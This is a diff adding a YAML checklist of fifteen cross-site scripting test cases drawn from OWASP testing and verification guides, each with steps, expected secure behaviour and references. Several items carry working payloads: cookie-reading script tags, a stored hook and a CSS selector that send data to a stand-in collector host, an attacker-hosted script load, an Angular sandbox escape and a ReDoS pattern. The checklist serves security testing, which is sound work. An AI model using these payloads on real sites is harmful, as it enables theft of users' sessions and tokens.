@@ -1,0 +1,451 @@
+- id: WEB-XSS-001
+  sheet: WEB
+  category: XSS
+  title: Test reflected input for cross-site scripting
+  objective: Finds input that is echoed back in the response without context-aware encoding.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - List every input that is reflected in the HTML response, including headers and hidden fields.
+  - Submit a basic script payload in each input and view the rendered page source.
+  - If the basic payload is blocked, try case variation, broken tags and non-recursive filter bypass payloads.
+  - Confirm execution with a popup or a network call to a collector host.
+  example: <script>alert(123)</script> ; "><script>alert(document.cookie)</script> ; <ScRiPt>alert(1)</ScRiPt> ; <scr<script>ipt>alert(1)</script>
+  expected: The response HTML-encodes or JavaScript-escapes the reflected value for its context, so no script executes.
+  severity: Medium
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-01
+    asvs:
+    - V1.1.1
+    - V1.1.2
+    - V1.2.1
+    cheatsheet:
+    - Cross_Site_Scripting_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    - CWE-80
+    - CWE-87
+    capec:
+    - CAPEC-63
+    - CAPEC-591
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/01-Reflected_Cross_Site_Scripting.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-XSS-002
+  sheet: WEB
+  category: XSS
+  title: Test stored input fields for persistent cross-site scripting
+  objective: Finds user content that is stored and later rendered without encoding to other users.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Identify fields that persist to a data store, such as a profile, comment or support ticket.
+  - Submit a script payload in the field and save it.
+  - Reload the page as the same user and as another user, including a higher-privilege user.
+  - If the payload is uploaded as a file, upload an HTML or SVG file and request it directly.
+  example: 'aaa@aa.com"><script>alert(document.cookie)</script> ; stored hook: "><script src=https://collaborator-host/hook.js></script>'
+  expected: Stored content is HTML-encoded on output for every viewer, and uploaded HTML or SVG files do not execute as script.
+  severity: High
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-INJT-02
+    asvs:
+    - V1.1.1
+    - V1.1.2
+    - V1.2.1
+    cheatsheet:
+    - Cross_Site_Scripting_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    capec:
+    - CAPEC-63
+    - CAPEC-592
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/07-Injection/02-Stored_Cross_Site_Scripting.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-XSS-003
+  sheet: WEB
+  category: XSS
+  title: Test HTML sanitization of rich text and WYSIWYG input
+  objective: Finds HTML sanitizers that fail to strip dangerous tags, attributes or SVG script content.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find a feature that accepts rich HTML input, such as a WYSIWYG editor or markdown renderer.
+  - Submit script tags, event handler attributes and an SVG element with embedded script.
+  - Submit CSS, Markdown or template syntax that the renderer may evaluate as an expression.
+  - Compare the stored output against the sanitizer allowlist and confirm it rejects dangerous content.
+  example: <img src=x onerror=alert(1)> ; <svg onload=alert(1)><foreignObject><script>alert(1)</script></foreignObject></svg> ; Markdown/CSS/XSL expression payloads
+  expected: The sanitizer strips scripts, event handlers and dangerous SVG elements, keeping only an explicit allowlist of tags and attributes.
+  severity: High
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    asvs:
+    - V1.3.1
+    - V1.3.4
+    - V1.3.5
+    cheatsheet:
+    - Cross_Site_Scripting_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    - CWE-80
+    capec:
+    - CAPEC-63
+  sources_read:
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md
+- id: WEB-XSS-004
+  sheet: WEB
+  category: XSS
+  title: Test URL, JavaScript and CSS output contexts for correct encoding
+  objective: Finds output encoding that is missing or wrong for the URL, JavaScript, CSS or HTTP header context.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find a value placed into a URL attribute, a JavaScript variable, a CSS value and an HTTP header.
+  - Submit a context-breaking payload for each context, for example a quote for JavaScript or a URL scheme.
+  - 'Check if the javascript: or data: scheme is accepted in a URL attribute.'
+  - Confirm each context applies the matching encoder before use.
+  example: 'URL context: javascript:alert(1) in href ; JS context: '';alert(1);'' ; CSS context: expression(alert(1)) or url(javascript:alert(1))'
+  expected: 'Each context uses its matching encoder, and javascript: and data: schemes are rejected for navigable URLs.'
+  severity: Medium
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    asvs:
+    - V1.2.2
+    - V1.2.3
+    cheatsheet:
+    - Cross_Site_Scripting_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    - CWE-83
+    - CWE-84
+    capec:
+    - CAPEC-63
+    - CAPEC-18
+  sources_read:
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md
+- id: WEB-XSS-005
+  sheet: WEB
+  category: XSS
+  title: Test regular expressions and dynamic code features for injection and ReDoS
+  objective: Finds unescaped use of regular expression metacharacters and catastrophic backtracking patterns.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find inputs used to build a regular expression or passed to eval or a template expression language.
+  - Submit regex metacharacters to confirm they are escaped before being used.
+  - Submit a pattern crafted for exponential backtracking and measure response time.
+  - Confirm the application does not call eval or Spring Expression Language on the input.
+  example: 'Regex metachar probe: .*+ ; ReDoS payload: (a+)+$  followed by ''aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'' ; eval probe: 7*7'
+  expected: Regex metacharacters in user input are escaped, vulnerable patterns are avoided, and eval is never called on user input.
+  severity: Medium
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    asvs:
+    - V1.2.9
+    - V1.3.2
+    - V1.3.12
+    cwe:
+    - CWE-1333
+    - CWE-95
+    capec:
+    - CAPEC-242
+  sources_read:
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+- id: WEB-XSS-006
+  sheet: WEB
+  category: XSS
+  title: Test DOM sinks for DOM-based cross-site scripting
+  objective: Finds client-side JavaScript that writes an untrusted source into a dangerous DOM sink.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Review client-side JavaScript for sources such as location.hash, location.search and document.referrer.
+  - Trace each source to its sink, for example innerHTML, document.write or eval.
+  - Craft a payload in the URL fragment or query string that reaches the sink.
+  - Load the crafted URL and confirm script execution in the browser.
+  example: https://target/page#<script>alert(1)</script> ; https://target/?user=<img src=x onerror=alert(1)>
+  expected: Untrusted sources are written only through safe sinks such as textContent, or are sanitized before reaching innerHTML or eval-like sinks.
+  severity: Medium
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    owasp_top10:
+    - A05:2025
+    wstg:
+    - WSTG-CLNT-01
+    asvs:
+    - V3.2.2
+    cheatsheet:
+    - DOM_based_XSS_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    capec:
+    - CAPEC-588
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/01-DOM-based_Cross_Site_Scripting.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md
+  - sources/repos/Top10/2025/docs/en/A05_2025-Injection.md
+- id: WEB-XSS-007
+  sheet: WEB
+  category: XSS
+  title: Test self-triggered DOM XSS requiring a pasted payload
+  objective: Finds client-side sinks that execute attacker content only after the victim pastes it into the page.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find client-side functions that strip HTML tags using innerHTML and then read textContent.
+  - Craft an HTML payload designed to survive the strip step, such as an img tag with an onerror handler.
+  - Paste the payload into the field in the browser and submit it.
+  - Check the developer console for the payload executing.
+  example: <img src=x onerror=alert(1) /> pasted into a textarea whose submit handler reads innerHTML then textContent
+  expected: The page never relies on a user pasting raw markup into a sink that can re-parse it as HTML.
+  severity: Low
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-CLNT-01
+    cheatsheet:
+    - DOM_based_XSS_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    capec:
+    - CAPEC-588
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/01-DOM-based_Cross_Site_Scripting.md
+  - sources/repos/CheatSheetSeries/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md
+- id: WEB-XSS-008
+  sheet: WEB
+  category: XSS
+  title: Test JavaScript injection sinks outside script tags
+  objective: Finds JavaScript execution sinks reachable without a literal script tag, such as eval or location assignment.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Review the page for sinks such as eval, setTimeout, setInterval and window.location assignment that use untrusted data.
+  - 'Submit a javascript: scheme payload where the sink assigns a user-controlled value to a navigation property.'
+  - Confirm execution in the browser developer console.
+  example: www.target.com/?javascript:alert(1) read by window.location=decodeURIComponent(location.search.substring(1))
+  expected: User-controlled values never reach eval, setTimeout, setInterval or a navigation sink without validation.
+  severity: Medium
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-CLNT-02
+    cheatsheet:
+    - DOM_based_XSS_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    - CWE-95
+    capec:
+    - CAPEC-19
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/02-JavaScript_Execution.md
+  - sources/repos/CheatSheetSeries/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.md
+- id: WEB-XSS-009
+  sheet: WEB
+  category: XSS
+  title: Test client-side HTML injection sinks
+  objective: Finds client-side code that writes untrusted data into innerHTML or document.write.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find client-side code that writes a URL fragment, query parameter or API response into innerHTML or document.write.
+  - Submit an image tag with an onerror handler in the relevant input.
+  - Confirm the payload executes in the rendered page.
+  example: https://target/page.html?user=<img%20src='x'%20onerror=alert(1)>
+  expected: Untrusted data is written only through safe text sinks, or is sanitized with a vetted library before reaching innerHTML.
+  severity: Medium
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    wstg:
+    - WSTG-CLNT-03
+    asvs:
+    - V3.2.2
+    cheatsheet:
+    - Cross_Site_Scripting_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    - CWE-83
+    capec:
+    - CAPEC-63
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/03-HTML_Injection.md
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.md
+- id: WEB-XSS-010
+  sheet: WEB
+  category: XSS
+  title: Test CSS injection and CSS-based data exfiltration
+  objective: Finds unsanitized CSS values that enable style injection or attribute-selector data theft.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find a sink that assigns untrusted data to a style property or cssText.
+  - Submit a CSS value that changes page layout or injects a background-image URL pointing to a collector.
+  - If a token field is styled by value, craft an attribute selector probe to leak characters one at a time.
+  example: 'location.hash fed to style.cssText = "color: "+hash ; CSS exfil: input[name=csrf_token][value^=a]{background-image:url(https://collaborator-host/log?a)}'
+  expected: User-controlled values never reach a raw CSS sink, and CSS attribute-selector probing cannot read token values.
+  severity: Medium
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-CLNT-05
+    cwe:
+    - CWE-79
+    capec:
+    - CAPEC-63
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/05-CSS_Injection.md
+- id: WEB-XSS-011
+  sheet: WEB
+  category: XSS
+  title: Test client-side resource loading for injection in the request URL
+  objective: Finds client-side code that loads a script or CORS resource from a URL taken from an untrusted source.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Find client-side code that assigns location.hash or a similar source to a script src or XHR URL.
+  - Craft a URL fragment pointing to an attacker-controlled script.
+  - Load the crafted link and confirm the attacker script executes and can read the response.
+  example: www.target.com/#https://attacker-host/js.js loaded by d.src=location.hash.slice(1)
+  expected: Resource URLs built from client-controlled sources are validated against an allowlist before being loaded.
+  severity: High
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-CLNT-06
+    cwe:
+    - CWE-79
+    - CWE-918
+    capec:
+    - CAPEC-63
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/06-Client-side_Resource_Manipulation.md
+- id: WEB-XSS-012
+  sheet: WEB
+  category: XSS
+  title: Test client-side template rendering for CSTI
+  objective: Finds client-side frameworks that evaluate user input as template expression syntax.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Identify the client-side framework from HTML attributes or the global object in the console.
+  - Submit the generic arithmetic probe {{7*7}} in the field reflected into the template.
+  - If rendered as 49, try a framework-specific sandbox-escape payload to reach arbitrary code execution.
+  example: '{{ 7*7 }} ; Angular 1.5.x sandbox bypass: {{x={"y":"".constructor.prototype};x["y"].charAt=[].join;$eval("x=alert(1)");}}'
+  expected: User input is bound as data only and is never interpolated into template source that the framework parses as an expression.
+  severity: High
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-CLNT-15
+    cheatsheet:
+    - Server_Side_Template_Injection_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-1336
+    - CWE-79
+    capec:
+    - CAPEC-242
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/15-Client-Side_Template_Injection.md
+  - sources/repos/CheatSheetSeries/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.md
+- id: WEB-XSS-013
+  sheet: WEB
+  category: XSS
+  title: Test markup sanitization against DOM clobbering
+  objective: Finds sanitized markup that keeps id or name attributes letting an attacker override a global reference.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Submit a probe anchor and image with distinctive id and name values into a field rendered as sanitized HTML.
+  - Open the rendered page and check window and document for the probe properties in the console.
+  - Review client-side code for default values and existence checks read from window or document that may be undefined.
+  - If a clobberable reference feeds a script src or a location assignment, build a clobbering payload for that sink.
+  example: <a id="wstgprobe" name="wstgprobe" href="https://example.com/wstgprobe"></a><img name="wstgprobe2" src="https://example.com/wstgprobe2.png"> then check window.wstgprobe in console
+  expected: The sanitizer strips id and name attributes from user HTML, or client-side code never reads an unguarded value from window or document.
+  severity: High
+  test_type: Manual
+  refs:
+    wstg:
+    - WSTG-CLNT-16
+    cheatsheet:
+    - DOM_Clobbering_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    capec: []
+  sources_read:
+  - sources/repos/wstg/document/4-Web_Application_Security_Testing/11-Client-side/16-DOM_Clobbering.md
+  - sources/repos/CheatSheetSeries/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.md
+- id: WEB-XSS-014
+  sheet: WEB
+  category: XSS
+  title: Test content rendering context to prevent incorrect HTML interpretation
+  objective: Finds direct resources such as uploads or API responses that browsers may render as HTML in the wrong context.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Request an uploaded file or API response directly in the browser and inspect the returned Content-Type and Content-Disposition.
+  - Check whether the Sec-Fetch-Dest header is honored to block a navigation request for a non-document resource.
+  - Upload an HTML file and request it directly to see whether it renders as a page.
+  example: GET /uploads/user1.html directly, and GET /api/data expecting application/json but served without a disposition header
+  expected: The server sets a correct Content-Type, uses an attachment disposition or a sandboxed response for user content, and never renders uploads as HTML.
+  severity: Medium
+  test_type: Manual
+  level: ASVS L1
+  refs:
+    asvs:
+    - V3.2.1
+    cwe:
+    - CWE-434
+    capec:
+    - CAPEC-650
+  sources_read:
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+- id: WEB-XSS-015
+  sheet: WEB
+  category: XSS
+  title: Test client-side code for DOM clobbering safe coding practices
+  objective: Finds global variable use that bypasses explicit declaration, type checking or namespace isolation.
+  preconditions:
+  - Do not run on production.
+  steps:
+  - Review client-side JavaScript for default values read from window or document without an explicit declaration.
+  - Check whether the code performs strict type checking before trusting a global reference.
+  - Check whether the application namespaces its globals instead of storing state directly on window or document.
+  example: 'Example vulnerable pattern: const config = window.config || {}; without type checking or a namespaced container'
+  expected: All globals are explicitly declared, strictly type-checked before use, and isolated in an application namespace.
+  severity: Info
+  test_type: Code Review
+  level: ASVS L3
+  refs:
+    asvs:
+    - V3.2.3
+    cheatsheet:
+    - DOM_Clobbering_Prevention_Cheat_Sheet
+    cwe:
+    - CWE-79
+    capec: []
+  sources_read:
+  - sources/asvs5/OWASP_Application_Security_Verification_Standard_5.0.0_en.flat.json
+  - sources/repos/CheatSheetSeries/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.md
